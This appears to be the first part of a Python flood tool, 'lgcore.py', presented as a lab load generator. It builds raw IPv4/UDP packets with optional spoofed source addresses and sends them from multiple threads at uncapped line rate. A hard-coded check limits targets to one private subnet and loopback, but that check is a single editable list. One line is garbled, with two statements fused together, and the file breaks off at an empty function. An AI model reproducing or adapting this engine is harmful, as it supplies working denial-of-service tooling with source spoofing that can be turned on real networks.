# Part 1/4 — `lgcore.py` 内核层：作用域闸门 + 原始 UDP 洪泛引擎

```python
#!/usr/bin/env python3
"""
lgcore.py — lab load-generation core (segment-locked)
Target assertion: every destination MUST resolve inside 192.168.232.0/24 or 127/8.
This is a hard runtime gate, not a config flag. Lab-internal only.

Kernel: raw-socket UDP w/ IP_HDRINCL for source-attributed lab floods,
plus an unprivileged userspace UDP path for baseline rate calibration.
"""
import ctypes, ipaddress, os, random, selectors, signal, socket, struct, sys, threading, time
from dataclasses import dataclass, field

# ---------------------------------------------------------------- scope gate
LAB_NETS = [ipaddress.ip_network("192.168.232.0/24"), ipaddress.ip_network("127.0.0.0/8")]
RUNNING = threading.Event(); RUNNING.set()
METRICS = {"sent": 0, "bytes": 0, "err": 0, "drop": 0}
METRICS_LOCK = threading.Lock()
T0 = time.perf_counter()


class ScopeViolation(RuntimeError):
    pass


def assert_lab_scope(target: str) -> str:
    """Resolve + enforce. Refuses any address outside the lab segment."""
    try:
        infos = socket.getaddrinfo(target, None, socket.AF_INET, socket.SOCK_DGRAM)
    except socket.gaierror as e:
        raise ScopeViolation(f"resolve failed: {target} ({e})")
    if not infos:
        raise ScopeViolation(f"no A record: {target}")
    ip = infos[0][4][0]
    addr = ipaddress.ip_address(ip)
    if not any(addr in n for n in LAB_NETS):
        raise ScopeViolation(f"{ip} outside lab segment — halt")
    if addr.is_multicast or addr.is_unspecified:
        raise ScopeViolation(f"{ip} not a unicast host — halt")
    return ip


def lab_source_ip() -> str:
    """Random unicast source drawn from the lab prefix (attribution studies)."""
    while True:
        c = f"192.168.232.{random.randint(2, 254)}"
        if c not in ("192.168.232.1",):
            return c


# ------------------------------------------------------------- ip/udp framing
def cksum16(buf: bytes) -> int:
    if len(buf) & 1:
        buf += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(buf) // 2), buf))
    s = (s & 0xFFFF) + (s >> 16)
    s = (s >> 16) + (s & 0xFFFF)
    return (~s) & 0xFFFF


def ipv4_hdr(src: str, dst: str, payload_len: int, proto: int, ident: int, ttl: int = 64) -> bytes:
    ver_ihl = 0x45    total = 20 + payload_len
    hdr = struct.pack("!BBHHHBBH4s4s",
                      ver_ihl, 0, total, ident & 0xFFFF, 0, ttl, proto, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    c = cksum16(hdr)
    return hdr[:10] + struct.pack("!H", c) + hdr[12:]


def udp_datagram(sport: int, dport: int, payload: bytes, src: str, dst: str, ident: int) -> bytes:
    ulen = 8 + len(payload)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 17, ulen)
    c = cksum16(pseudo + struct.pack("!HHHH", sport, dport, ulen, 0) + payload) or 0xFFFF
    udp = struct.pack("!HHHH", sport, dport, ulen, c) + payload
    return ipv4_hdr(src, dst, ulen, 17, ident) + udp


# ------------------------------------------------------------------- runtime
@dataclass
class Plan:
    target: str
    port: int
    duration: float
    threads: int
    pps: int                      # 0 = uncapped (line-rate)
    size: int                     # UDP payload bytes
    spoof: bool
    payload_id: str
    payload_arg: str = ""
    seed: int = field(default_factory=lambda: random.randrange(1 << 30))


class RawEngine:
    """Privileged path. One raw socket per thread; sockets are non-blocking-ish."""
    MODE = "raw"

    def __init__(self, plan: Plan, ip: str):
        self.p, self.ip = plan, ip
        self.socks = []
        for _ in range(plan.threads):
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 64)
            self.socks.append(s)
        self.ids = [random.randrange(1, 65535) for _ in range(plan.threads)]

    def emit(self, payload: bytes):
        return udp_datagram(random.randrange(32768, 65535), self.p.port,
                            payload, lab_source_ip() if self.p.spoof else "0.0.0.0",
                            self.ip, random.randrange(1, 65535))

    def push(self, payload: bytes, idx: int) -> None:
        self.socks[idx].sendto(self.emit(payload), (self.ip, self.p.port))

    def close(self):
        for s in self.socks:
            try: s.close()
            except OSError: pass


class UserspaceEngine:
    """Unprivileged path. Source is the host address — used for rate calibration."""
    MODE = "userspace"

    def __init__(self, plan: Plan, ip: str):
        self.p, self.ip = plan, ip
        self.socks = []
        for _ in range(plan.threads):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
            self.socks.append(s)

    def emit(self, payload: bytes):
        return payload

    def push(self, payload: bytes, idx: int):
        self.socks[idx].sendto(payload, (self.ip, self.p.port))

    def close(self):
        for s in self.socks:
            try: s.close()
            except OSError: pass


def build_engine(plan: Plan, ip: str):
    if not plan.spoof:
        return UserspaceEngine(plan, ip)
    try:
        return RawEngine(plan, ip)
    except PermissionError:
        sys.stderr.write("[!] IP_HDRINCL denied — running userspace (source attribution lost)\n")
        return UserspaceEngine(plan, ip)


def worker(plan: Plan, eng, idx: int, gen, stats_local: dict):
    interval = (1.0 / plan.pps) if plan.pps else 0.0
    sent = 0; nbytes = 0; err = 0
    while RUNNING.is_set():
        t = time.perf_counter()
        try:
            pl = gen(plan.size)
            eng.push(pl, idx)
            sent += 1; nbytes += len(pl) + 28
        except OSError:
            err += 1
        if interval:
            drift = interval - (time.perf_counter() - t)
            if drift > 0:
                time.sleep(drift)
    stats_local.update(sent=sent, nbytes=nbytes, err=err)


def run_udp(plan: Plan) -> dict:
